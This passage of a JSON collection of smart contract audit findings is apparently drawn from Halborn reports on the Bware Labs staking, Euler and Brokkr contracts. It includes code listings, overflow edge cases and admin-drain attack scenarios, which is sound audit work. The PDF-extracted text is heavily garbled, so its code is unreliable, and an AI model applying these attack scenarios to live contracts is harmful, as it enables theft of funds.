owner ); bwr . approve ( address ( stakingContract ) , 100000 ether ); stakingContract . depositRewards (100000 ether ); vm . warp ( block . timestamp + 1 days ); poolIds . push ( poolId ); performances . push (1000) ; ownersBaseApy . push (0) ; vm . stopPrank () ; currencies . push ( aCurrency ); 27 28 29 stakingContract . createNewPool (0 , 0 , uint16 (  MIN_POOL_COMMISSION_FEE ) , currencies ); // currencies 30 31  uint32 (0) )); 32 33 34 35  internal { 36 37 38 39 40 41 42 43 44 45 46 47 48  ownersBaseApy ); 49 50 51 52 53 54 55 56 57 58  amount , address token ) internal { 59 60 61 62 63 64 } vm . stopPrank () ; poolIds . pop () ; performances . pop () ; ownersBaseApy . pop () ; vm . warp ( block . timestamp + 1 days ); stakingContract . endEpoch () ; vm . startPrank ( finalizer ); for ( uint256 i ; i < times ; ++ i){ currencies . pop () ; vm . startPrank ( owner ); IERC20Upgradeable ( token ). transfer ( user , amount ); vm . stopPrank () ; function _delegate ( address user , bytes32 poolId , uint256 vm . startPrank ( user ); } vm . warp ( block . timestamp + 1 days ); stakingContract . finalizePools ( poolIds , performances , 21 IERC20Upgradeable ( token ). approve ( address ( stakingContract ) , 65  amount ); 66 67 68 69 70 71 72 73 74 } bCurrency . erc20 = IERC20Upgradeable ( token ); bCurrency . amount = amount ; currencies . push ( bCurrency ); stakingContract . delegate ( poolId , currencies ); vm . stopPrank () ; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:P/S:U (2.5) Recommendation: It is recommended to consider allowing the poolOwner to change the state of the pool from TERMINATED to OPERATIVE on the restake operation. Remediation Plan: NOT APPLICABLE: The Bware Labs stated this is a design choice. Whether the poolOwner removes all their stake from the node operator, the pool is set to TERMINATED state, which is a desired behavior. 22 ",
        "labels": [
            "Halborn",
            "Bware_Labs_Staking_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "NOT ALL ROLES ARE SET UP ON INITIALIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bware_Labs_Staking_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf.pdf",
        "body": "In the Staking.sol contract, the initialize() function does not call the setupRole() functions for all available roles when initializing the contract. The PAUSER_ROLE, JAILER_ROLE, FINALIZER_ROLE roles need to be set with the _setupRole() function manually by the account assigned the OWNER_ROLE. Code Location: Code Section - Staking.sol#L81 Listing 4: Staking.sol (Lines 89-92) address protocolOwner , IERC20Upgradeable rewardsToken_ , uint256 minEpochDuration ) public initializer { __StakingEpochManager_init_unchained ( minEpochDuration ); 81 function initialize ( 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 } _setupRole ( OWNER_ROLE , protocolOwner ); _setRoleAdmin ( OWNER_ROLE , OWNER_ROLE ); _setRoleAdmin ( PAUSER_ROLE , OWNER_ROLE ); _setRoleAdmin ( JAILER_ROLE , OWNER_ROLE ); _setRoleAdmin ( FINALIZER_ROLE , OWNER_ROLE ); _initializeRewardsToken ( rewardsToken_ ); // pause protocol until entirely configured _pause () ; 23 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:P/S:U (2.5) Recommendation: Set up all available roles in the contract on initialization. Remediation Plan: RISK ACCEPTED: The Bware Labs team plans to set roles manually by the multi-signature account, that has OWNER_ROLE role, after the deployment. 24 ",
        "labels": [
            "Halborn",
            "Bware_Labs_Staking_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "USE CUSTOM ERRORS TO SAVE GAS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bware_Labs_Staking_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf.pdf",
        "body": "Custom errors are available from Solidity version 0.8.4. Custom errors save ~50 gas each time they are hit by avoiding having to allocate and store the revert string. Not defining strings also saves deployment gas. Code Location: In the following contracts, the errors can be customized:  Staking.sol  DelegationsAdapter.sol  TransfersAdapter.sol  StakingEpochManager.sol  Finalizer.sol BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) Recommendation: Consider replacing all revert strings with custom errors. Remediation Plan: ACKNOWLEDGED: The Bware Labs acknowledged this finding. 25 ",
        "labels": [
            "Halborn",
            "Bware_Labs_Staking_Protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "INEFFICIENT CONDITION IN THE FINALIZEPOOL INTERNAL FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bware_Labs_Staking_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf.pdf",
        "body": "When a pool is jailed, as the baseReward and the poolReward is equal to zero after the code in line 179 executes, the arithmetic operations performed in lines 181 and 182 can be skipped and the poolReward and baseReward variables can be immediately set to 0. Code Location: Code Section - Finalizer.sol#175 Listing 5: Finalizer.sol (Lines 175,176) 170 171 172 173 174 175 if ( poolPtr . meta . jailed ) { poolReward = 0; baseReward = 0; } // apply slashing on all reward types poolReward = ( poolReward * performance ) /  PERCENTAGE_SCALING_FACTOR ; 176 baseReward = ( baseReward * performance ) /  PERCENTAGE_SCALING_FACTOR ; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) 26 Proof of Concept: As you can see in the following images, the function _finalizePool costs 300 gas units less by using the else condition as mentioned below. Recommendation: Consider adding an else condition after the if statement that encapsulates these lines. Listing 6: Finalizer.sol (Line 175) 170 171 172 173 174 175 176 if ( poolPtr . meta . jailed ) { poolReward = 0; baseReward = 0; } // apply slashing on all reward types else { poolReward = ( poolReward * performance ) /  PERCENTAGE_SCALING_FACTOR ; 177 baseReward = ( baseReward * performance ) /  PERCENTAGE_SCALING_FACTOR ; 178 } Remediation Plan: ACKNOWLEDGED: The Bware Labs acknowledged this finding. 27 RECOMMENDATIONS OVERVIEW 28 1. It is recommended that the poolOwner can still change the state of the pool from TERMINATED to OPERATIVE if he stakes again. 2. Set all the needed roles within the contract during initialization. 3. Consider replacing all revert strings with custom errors. 4. Consider adding an else condition after the if statement that en- capsulates these lines. W E I V R E V O S N O I T A D N E M M O C E R 29 RE-TEST 30 The issue described in this section was brought to Halborns attention by the Bware Labs team during the engagement. 6.1 BWARE01 - THERE IS NO CAP FOR THE POOL OWNERS STAKE ",
        "labels": [
            "Halborn",
            "Bware_Labs_Staking_Protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "Some of the contracts use a floating pragma, such as ^0.8.0. Deploy contracts with the same compiler version and flags used during devel- opment and testing. Locking the pragma helps ensure that contracts do not accidentally get deployed using a different compiler specification. For example, an outdated compiler version might introduce bugs, or a new version that is not extensively tested may introduce security vulnera- bilities. Code Location: Listing 1: BaseLogic.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 2: BaseIRM.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 3: Constants.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 4: Interfaces.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; 14 Listing 5: Euler.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 6: Proxy.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 7: Storage.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 8: BaseModule.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 9: Events.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 10: Base.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; 15 Listing 11: views/EulerGeneralView.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 12: vendor/TickMath.sol (Lines 9) 5 // Updated to Solidity 0.8 by Euler : 6 // 7 // * Cast MAX_TICK to int256 before casting to uint * Wrapped function bodies with \" unchecked {}\" so as to not add any extra gas costs 8 9 pragma solidity ^0.8.0; Listing 13: modules/Exec.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 14: modules/Installer.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 15: modules/Markets.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 16: modules/EToken.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; 16 Listing 17: modules/RiskManager.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 18: modules/DToken.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 19: modules/Governance.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 20: modules/Liquidation.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 21: modules/interest-rate-models/IRMLinearRecursive.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 22: modules/interest-rate-models/IRMZero.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; 17 Listing 23: modules/interest-rate-models/IRMLinear.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 24: modules/interest-rate-models/IRMFixed.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 25: modules/interest-rate-models/IRMDefault.sol (Lines 1) 1 pragma solidity ^0.8.0; Risk Level: Likelihood - 1 Impact - 3 Recommendations: Lock the pragma version whenever possible and avoid using a floating pragma in the final deployment. The pragma can be locked in the code by removing the caret () and by specifying the exact version in the Truffle configuration file truffle-config.js or hardhat.config.js if using the HardHat framework. Remediation Plan: RISK ACCEPTED: Euler team accepted this risk. During development its easier to upgrade the compiler if its floating, and post-deployment it obviously cant be changed anyway, so they will fixate the compiler version when deploying. 18 ",
        "labels": [
            "Halborn",
            "Euler",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "During a manual static review, the tester noticed the use of block. timestamp in BaseLogic, RiskManager, Markets and Liquidation contract. The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block .timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: Listing 26: Liquidation.sol (Lines 191) 189 190 191 192 if ( bonus > 1 e18 ) bonus = 1 e18 ; bonus = bonus * ( block . timestamp - lastActivity ) / BONUS_REFRESH_PERIOD ; if ( bonus > 1 e18 ) bonus = 1 e18 ; Listing 27: BaseLogic.sol (Lines 27) 25 26 27 function updateLastActivity ( address account ) internal { uint lastActivity = accountLookup [ account ]. lastActivity ; if ( lastActivity != 0 && lastActivity != block . timestamp ) accountLookup [ account ]. lastActivity = uint40 ( block . timestamp ); 28 } Listing 28: BaseLogic.sol (Lines 163,166) 161 162 163 // Update interest accumulator and reserves if ( block . timestamp != assetCache . lastInterestAccumulatorUpdate ) { 19 164 165 166 167 168 dirty = true ; uint deltaT = block . timestamp - assetCache . lastInterestAccumulatorUpdate ; // Compute new values Listing 29: BaseLogic.sol (Lines 193) 191 192 193 194 195 assetCache . totalBorrows = encodeDebtAmount ( newTotalBorrows ); assetCache . interestAccumulator = newInterestAccumulator ; assetCache . lastInterestAccumulatorUpdate = uint40 ( block . timestamp ); if ( newTotalBalances != assetCache . totalBalances ) { Listing 30: RiskManager.sol (Lines 146) 144 145 146 147 148 // Call observe () again to get the oldest available ago = block . timestamp - oldestAvailableAge ; secondsAgos [0] = uint32 ( ago ); Listing 31: Markets.sol (Lines 57) 55 56 57 58 59 assetStorage . dTokenAddress = childDToken ; assetStorage . lastInterestAccumulatorUpdate = uint40 ( block . timestamp ); assetStorage . underlyingDecimals = decimals ; assetStorage . interestRateModel = uint32 ( MODULEID__IRM_DEFAULT ) ; Listing 32: Markets.sol (Lines 162) 160 161 162 163 } address msgSender = unpackTrailingParamMsgSender () ; address account = getSubAccount ( msgSender , subAccountId ); accountLookup [ account ]. lastActivity = uint40 ( block . timestamp ); 20 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. If possible, use an oracle. Remediation Plan: For instance see RISK ACCEPTED: This is part of our systems design. the Compounding Behaviour in the arch doc. I dont believe miners can extract any value by manipulating the timestamp within the networks allowable range. 21 ",
        "labels": [
            "Halborn",
            "Euler",
            "Severity: Low"
        ]
    },
    {
        "title": "NO STORAGE REFUND WHEN EXITING THE MARKET",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "During a manual static review, the tester noticed that the doExitMarket function on BaseLogic does not zero out the storage when numMarketsEntered is set to 1. For the showcase, the code shown in Listing ?? was written. The ?? shows that the value was not zeroed out when exiting the last market. Listing 33: Code used to showcase memory not zeroed out 1 function halborn_market ( uint subAccountId , uint256 index ) external returns ( address ){ return halborn_marketbase ( subAccountId , index ); 2 3 } 4 5 function halborn_marketbase ( uint subAccountId , uint256 index ) public returns ( address ){ address msgSender = unpackTrailingParamMsgSender () ; address account = getSubAccount ( msgSender , subAccountId ); address [ MAX_POSSIBLE_ENTERED_MARKETS ] storage markets = marketsEntered [ account ]; return _getEnteredMarketIndex ( account , markets , index ); 6 7 8 9 10 } 22 Code Location: Listing 34: BaseLogic.sol (Lines 90,94) 76 function doExitMarket ( address account , address underlying ) internal { uint32 numMarketsEntered = accountLookup [ account ]. numMarketsEntered ; address [ MAX_POSSIBLE_ENTERED_MARKETS ] storage markets = marketsEntered [ account ]; uint searchIndex = type ( uint ). max ; for ( uint i = 0; i < numMarketsEntered ; i ++) { if ( _getEnteredMarketIndex ( account , markets , i ) == underlying ) { searchIndex = i; break ; } } if ( searchIndex == type ( uint ). max ) return ; // already exited uint lastMarketIndex = numMarketsEntered - 1; if ( searchIndex != lastMarketIndex ) _setEnteredMarketIndex ( 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 23 account , markets , searchIndex , _getEnteredMarketIndex ( account , markets , lastMarketIndex )) ; accountLookup [ account ]. numMarketsEntered - -; if ( lastMarketIndex != 0) _setEnteredMarketIndex ( account , markets , lastMarketIndex , address (0) ) ; // zero out for storage refund 92 93 94 95 } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to be consistent in the code and make sure that 0 indices are correctly checked and always kept in mind. Not being consistent on the usage of the indices could lead to out-of-bounds access or unexpected behaviours. Remediation Plan: RISK ACCEPTED: This is intentional. Thats why there is the explicit if condition for this on line 94 of Listing 34. The reason is that the first market entered is packed into a slot with other fields. If any of them are non-zero then there will be no refund issued. Secondly, by leaving it non-zero, it will be cheaper to enter a market in the future. Since exit market operations can be done in a transaction that uses a very small amount of gas, it is possible that the storage refund will not be fully claimable (refunds are only claimable up to half a transactions gas usage), so in these cases exiting and entering a market actually nets out to be cheaper if left set. Avoiding un-claimable refunds is the same reason that the re-entrancy guard uses the values 1 and 2, rather than 0 and 1. 24 ",
        "labels": [
            "Halborn",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "INVALID CONSTANT VALUE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "During a manual static review, the tester noticed that the constant value defined in all the interest-rate-models contracts are returning a dif- ferent value than the one described on the comments. The comment states that the value is the result of the 10% APR = 1e27 * 0.1 / (86400*365) operation resulting in 3170979198376458650 on the code. However, the re- sult of the previous stated operation is 3170979198376458752 a difference of 102 units. Code Location: Listing 35: IRMDefault.sol 9 uint internal constant MAX_IR = 3170979198376458650; // 10% APR = 1 e27 * 0.1 / (86400*365) Listing 36: IRMLinear.sol 13 uint internal constant MAX_IR = 3170979198376458650; // 10% APR = 1 e27 * 0.1 / (86400*365) Listing 37: IRMFixed.sol 14 return 3170979198376458650; // 10% APR = 1 e27 * 0.1 / (86400*365) Listing 38: IRMLinearRecursive.sol 12 int internal constant MAX_IR = 3170979198376458650; // 10% APR = 1 e27 * 0.1 / (86400*365) 25 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to either fix the comment with the correct operation or change the constant value to reflect the described operation. Remediation Plan: RISK ACCEPTED: The comment and constant values are correct. The python code that demonstrates this is experiencing floating point rounding error. Double precision floating point has a precision of approximately 16 decimal places, which is why you observe it as off by about 2 decimal places. ",
        "labels": [
            "Halborn",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "INFINITE ALLOWANCE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "Setting the allowance value to -1 or MAX UINT 256 on the EToken and DToken contract does allow the spender to keep performing transfers until a new approval is set on the spender. Code Location: Listing 39: EToken.sol (Lines 186) 186 187 if (! isSubAccountOf ( msgSender , from ) && assetStorage . eTokenAllowance [ from ][ msgSender ] != type ( uint ). max ) { require ( assetStorage . eTokenAllowance [ from ][ msgSender ] >= amount , \"e / insufficient - allowance \"); 26 188 189 } unchecked { assetStorage . eTokenAllowance [ from ][ msgSender ] -= amount ; } Listing 40: DToken.sol (Lines 165) 165 166 167 168 if (! isSubAccountOf ( msgSender , to ) && assetStorage . dTokenAllowance [ to ][ msgSender ] != type ( uint ). max ) { require ( assetStorage . dTokenAllowance [ to ][ msgSender ] >= amount , \"e / insufficient - allowance \"); unchecked { assetStorage . dTokenAllowance [ to ][ msgSender ] -= amount ; } } Risk Level: Likelihood - 1 Impact - 1 Recommendations: Follow the standard ERC20 practices and allow the user to increase and decrease the approval amount (see increaseApproval and decreaseApproval of StandardToken.sol#L63-L98). If this is not possible, ensure users are aware of this extra functionality Furthermore, it is and encourage them to use it when appropriate. preferable to periodically increase the allowance rather than disabling the allowance feature by using a max value. Remediation Plan: RISK ACCEPTED: This is intentional. For better or for worse, the in- crease/decreaseAllowance methods are almost never used in real-life, and users almost always authorise infinite allowance to contracts (probably because by convention it is cheaper to interact with tokens in this state since they dont bother decrementing the allowance). 27 MANUAL TESTING 28 During the manual testing multiple questions where considered while eval- uation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can it be called twice in the same block and cause issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation . . .  Are the function parameters and variables controlled by external contracts?  Can extended contracts cause issues on the extender contract?  Can we bypass Proxy restrictions and interact with the contract directly? During the initial steps, coverage information was taken from the hardhat test cases. The uncovered lines were manually tested and kept in mind for logic errors and possible side-effects during the execution of the contracts. This information can be seen in 41. Listing 41 | 1 - - - - - - - - - - - - - - - - - - - - - - - - - - - - -| - - - - - - - - - -| - - - - - - - - - - - - - - - -| 2 File % Lines | Uncovered Lines | 3 - - - - - - - - - - - - - - - - - - - - - - - - - - - - -| - - - - - - - - - -| - - - - - - - - - - - - - - - -| | 4 92 | 5 6 | 150 ,433 ,434 | 7 | 8 | 9 21 | 10 | 11 | 12 | 13 | 14 160 ,167 | 15 | 16 contracts / Base . sol BaseIRM . sol BaseLogic . sol BaseModule . sol Constants . sol Euler . sol Events . sol Interfaces . sol Proxy . sol Storage . sol DToken . sol EToken . sol 97.93 | 95.83 | 100 | 98.43 | 100 | 100 | 92.86 | 100 | 100 | 100 | 100 | 97.22 | 100 | | | | | | | | | | | | | | 29 G N I T S E T L A U N A M | Exec . sol | Governance . sol | Installer . sol | Liquidation . sol | Markets . sol | RiskManager . sol | IRMFixed . sol | IRMLinear . sol | IRMLinearRecursive . sol | IRMZero . sol | InvariantChecker . sol | JunkETokenUpgrade . sol | JunkMarketsUpgrade . sol | LiquidationTest . sol | MockUniswapV3Factory . sol MockUniswapV3Pool . sol | SimpleUniswapPeriphery . sol | | TestERC20 . sol | RPow . sol | TickMath . sol | EulerGeneralView . sol 80.88 |... 84 ,90 ,92 ,94 | 17 | 100 | 18 83.33 | 33 ,34 | 19 95.29 |123 ,125 ,150 ,151 | 20 92.16 | 77 ,144 ,145 ,146 | 21 71 ,73 ,171 ,196 | 96.19 | 22 | 100 | 23 | 100 | 24 15 ,16 | 0 | 25 | 100 | 26 0 |... 84 ,87 ,90 ,93 | 27 | 100 | 28 | 100 | 29 55 | 93.75 | 30 | 100 | 31 89.47 | 40 ,44 | 32 58.82 |... 60 ,68 ,81 ,84 | 33 80 | 39 ,40 ,56 ,65 ,73 | 34 | 35 | 36 37 95 ,96 ,98 ,100 | 38 - - - - - - - - - - - - - - - - - - - - - - - - - - - - -| - - - - - - - - - -| - - - - - - - - - - - - - - - -| 39 All files | 40 - - - - - - - - - - - - - - - - - - - - - - - - - - - - -| - - - - - - - - - -| - - - - - - - - - - - - - - - -| 100 | 100 | 90.48 | 88.93 | | Some logical ideas were manually tested which include but not limited to:  unpackTrailingParams does some validations, but can it be crafted to cause errors?  Can module and proxy dependency be bypassed.  Can I activate an Etoken and Dtoken token on the market causing underlying miscalculations.  Decimal wrapping issues on Etokens if the underlying has different decimal places.  Bad balance interpretation of token on callBalanceOf.  What if the token contract is destroyed?  Use of unchecked bypassing SafeMath integration could lead to issues. G N I T S E T L A U N A M 30 Architecture overview: Except for a small amount of dispatching logic (see Euler.sol), the contracts are organised into modules, which live in contracts/modules/.  Each token must have its own address to conform to ERC-20, even though all storage lives inside the Euler contract The modules are divided in 3 categories:  Single-proxy modules: These are modules that are only accessible by a single address. For example, market activation is done by invoking a function on the single proxy for the Markets module. The IDs range is from 1 to 499,999.  Multi-proxy modules: These are modules that have many addresses. For example, each EToken gets an address, but any calls to them are dispatched to the single EToken module instance. The IDs range is from 500,000 to 999,999.  Internal modules: These are modules that are called internally by the Euler system and dont have any public proxies. These are only useful for their upgrade functionality, and the ability to stub in non-production code during testing/development. Examples are the RiskManager and interest rate model (IRM) modules. The IDs range is from 1,000,000 onwards. Since modules are invoked by delegatecall, they should not have any storage-related initialisation in their constructors (Otherwise collision The only thing that should be done in storage issues could happen). their constructors is to initialise immutable variables, since these are embedded into the contracts bytecode, not storage. Modules also should not define any storage variables. In the rare cases they need private storage (ie interest rate model state), they should use unstructured storage. G N I T S E T L A U N A M 31 Proxy Calling contract: If the caller of the proxy is the deployer, the proxy copies the calldata on address 0x1f causing the first byte to be misaligned using calldatacopy This first byte is then read and used on a (31, 0, calldatasize()). switch-case statement for logging purposes. If the caller is not the deployer, the dispatch function is then called with the original calldata used. 4.1 General issues while manually testing  trustedSenders for the installer module has the moduleImpl set to 0 on the Euler contract.  This happens because the proxy is created on the Euler contract creation with _createProxy which sets the struct moduleImpl to 0. The only time that the moduleImpl variable is set is during the call to installModules on Installer.sol. This means that all installed modules will have the moduleImpl variable set but not the Installer module as seen in Figure 1 and Figure 2. An expected code should be similar to the Listing 42. Listing 42: Expected code for the installer module added trustedSenders on the Euler constructor 1 2 address installerProxy = _createProxy ( MODULEID__INSTALLER ); trustedSenders [ installerProxy ]. moduleImpl = installerModule ; Figure 1: Code used to access the trustedSenders mapping  All Proxy creator should be set to Euler address. 32 G N I T S E T L A U N A M Figure 2: implementation is 0 Screenshot showing that the Installer trustedSenders It was observed that when creating the proxies for the activateMarket the trustedSenders mapping moduleImpl for the EToken and DToken module was not set. It was deduced that it should be at 0 since multiple implementations for them exists, aka multi-proxy. Figure 3: Screenshot showing that the implmentation of the Dtoken is set to 0 Successfully entering the market: G N I T S E T L A U N A M Figure 4: Successful transaction showing a enter market call BaseLogic: If numMarketsEntered is 1, the lastMarketIndex will be 0 causing the _setEnteredMarketIndex to not happen. This issue is shown as informative on the report.  ETokens and DTokens cannot be added as an active market since they 33 are checked using trustedSenders.  IRMFixed.sol and IRMLinear 3170979198376458650; // 10% APR = 1e27 * 0.1 / (86400*365) should be, this is reflected in an informative issue on the report. Listing 43 1 >>> int (1 e27 * 0.1 / (86400*365) ) 2 3170979198376458752 E-token deposit: Directly calling the implementation without passing though the proxy is causing reentrancy: Figure 5: manual/Untitled%205.png Multiplication on division: During automated testing multiple multiplication on division issues were found. Those issues were manually analyzed and were identified as not problematic since the truncation is done on purpose to round up internal representations. The function was compiled and bytecode analyzed in order to illustrate the opcode order as shown in Figure 6. Unchecked: The solidity version used 0.8.0 has SafeMath integration which performs arithmetic checks on each of the typed operations. A new keyword, named G N I T S E T L A U N A M 34 Figure 6: division Showing that the multiplication opcode is done after the unchecked was added in order to remove those security checks causing gas costs to decrease. All the unchecked usages are displayed in Listing 44. Listing 44: Unchecked keyword usage 1 BaseLogic . sol 2 143: unchecked { assetCache . underlyingDecimalsScaler = 10**(18 - underlyingDecimals ); } 3 148: unchecked { assetCache . poolSize = poolSize * assetCache . underlyingDecimalsScaler ; } 4 175: unchecked { scaledAmount = externalAmount * assetCache . underlyingDecimalsScaler ; } 5 248: unchecked { newFromBalance = origFromBalance - amount ; } 6 287: // unchecked is OK here since owed is always loaded from storage , so we know it fits into a uint144 ( pre - interest accural ) 7 293: 8 400: 9 429: 10 469: unchecked { unchecked { owedRemaining = owedRoundedUp - amount ; } unchecked { newFromBorrow = origFromBorrow - amount ; } unchecked { amountTransferred = poolSizeAfter - poolSizeBefore ; } 35 G N I T S E T L A U N A M 11 479: unchecked { amountTransferred = poolSizeBefore - poolSizeAfter ; } 12 13 vendor / TickMath . sol 14 7: // * Wrapped function bodies with \" unchecked {}\" so as to not add any extra gas costs unchecked { unchecked { 15 31: 16 71: 17 18 halborn / ERC20Example . sol 19 124: * Using this library instead of the unchecked operations eliminates an entire 20 21 modules / EToken . sol 22 91: 23 178: unchecked { unchecked { assetStorage . eTokenAllowance [ from ][ msgSender ] -= amount ; } 24 25 modules / DToken . sol 26 167: unchecked { assetStorage . dTokenAllowance [ to ][ msgSender ] -= amount ; } 27 28 modules / RiskManager . sol unchecked { 29 105: The code does use int96 very nicely, no issue with max values being overflowed or underflowed by truncating uint to int or the other way around. Could potentially overflow if owed is to large: Listing 45: Possible overflow (Lines 295) 290 function roundUpOwed ( AssetCache memory assetCache , uint owed ) internal pure returns ( uint ) { if ( owed == 0) return 0; unchecked { // max scale -> 0 x33b2e3c9fd0803ce8000000 --->>> 1 e9 * (10 ** 18) uint scale = INTERNAL_DEBT_PRECISION * assetCache . underlyingDecimalsScaler ; return ( owed + scale - 1) / scale * scale ; 291 292 293 294 295 296 36 G N I T S E T L A U N A M 297 298 } } As an example if owed is the following value: Listing 46 1 MAX_UINT256 - scale + 1 2 3 max scale -> 0 x33b2e3c9fd0803ce8000000 --->>> 1 e9 * (10 ** 18) 4 5 (2 ** 256) - 0 x33b2e3c9fd0803ce8000000 + 1 The roundUpOwed will be 0. Causing a division by zero error. To summarize if owed is larger than MAX_UINT256 - scale + 1 the operation will overflow and wrap around. As an example, by using the code shown in Listing 47 and by exceeding the cache maxExternalAmount value of the underlying asset the code was able to detect the overflow as shown in Figure 7. Listing 47: Function used to load the asset cache values 1 2 3 4 5 6 7 function halborn_cache () external returns ( AssetCache memory assetCache ) { ( address underlying , AssetStorage storage assetStorage , address proxyAddr , address msgSender ) = CALLER () ; AssetCache memory assetCache = loadAssetCache ( underlying , assetStorage ); return assetCache ; } 37 G N I T S E T L A U N A M Figure 7: Example transactions that lead to the detection of an overflow on the maxExternalAmount cache G N I T S E T L A U N A M 38 ",
        "labels": [
            "Halborn",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBILITY TO TRANSFER AN ARBITRARY AMOUNT OF TOKENS OUT OF SOME CONTRACTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P1_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The bonding-v1 and mvp-treasury contracts allow an admin (Brokkr team) to transfer an arbitrary amount of tokens out of them. Two possible attack scenarios will be described below. Attack scenario 1: 1. A malicious (or compromised) admin calls the update_config function in the bonding-v1 contract to change the value of treasury_contract to an address controlled by him. 2. As a consequence of Step 1, every time users provide LP tokens or UST to bonding-v1 contract, they will be transferred to the malicious address. Attack scenario 2: 1. A malicious (or compromised) admin calls the spend function in mvp- treasury contract with recipient = <address_controlled_by_attacker>. 2. As a consequence of Step 1, the aforementioned function could fully drain the mvp-treasury contract. Code Location: malicious A treasury_contract in bonding-v1 to an address controlled by him: compromised) change could admin (or the value of 15 Listing 1: contracts/bonding-v1/src/commands.rs (Line 310) 305 pub fn update_config ( 306 307 308 309 310 deps : DepsMut , owner : Option < String >, lp_token : Option < String >, rewards_pool_contract : Option < String >, treasury_contract : Option < String >, Listing 2: contracts/bonding-v1/src/commands.rs 